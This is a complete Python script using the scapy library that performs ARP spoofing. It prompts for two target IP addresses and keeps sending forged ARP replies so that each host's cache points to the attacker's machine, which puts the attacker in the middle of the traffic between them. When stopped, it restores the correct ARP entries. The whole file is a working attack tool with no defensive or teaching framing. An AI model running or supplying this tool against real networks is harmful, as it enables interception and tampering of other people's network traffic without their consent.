from scapy.all import Ether, ARP, srp, send
import time


def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') /
                 ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


def spoof(target_ip, spoof_ip, verbose=True):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip),
                 psrc=spoof_ip)
    send(packet, verbose=False)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, spoof_ip, self_mac))


def restore(destination_ip, source_ip, verbose=True):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=0)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(destination_ip,
                                                    source_ip, source_mac))


target1_ip = input("Enter your target1 IP: ")
target2_ip = input("Enter your target2 IP: ")

try:
    while True:
        spoof(target1_ip, target2_ip)
        spoof(target2_ip, target1_ip)
        time.sleep(2)

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(target2_ip, target1_ip)
    restore(target1_ip, target2_ip)
    print("[+] Arp Spoof Stopped")
